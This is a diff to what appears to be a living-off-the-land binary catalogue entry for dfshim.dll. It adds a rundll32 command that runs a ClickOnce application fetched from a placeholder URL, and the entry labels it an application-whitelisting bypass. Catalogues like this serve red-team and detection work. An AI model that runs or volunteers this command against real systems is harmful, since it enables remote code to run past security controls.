@@ -4,8 +4,8 @@ Description: ClickOnce engine in Windows used by .NET
 Author: 'Oddvar Moe'
 Created: '2018-05-25'
 Commands:
-  - Command: Missing Example 
-    Description: Missing example
+  - Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo 
+    Description: Executes click-once-application from Url
     Usecase: Use binary to bypass Application whitelisting
     Category: AWL bypass
     Privileges: User
@@ -23,6 +23,7 @@ Detection:
  - IOC: 
 Resources:
   - Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
+  - Link: https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
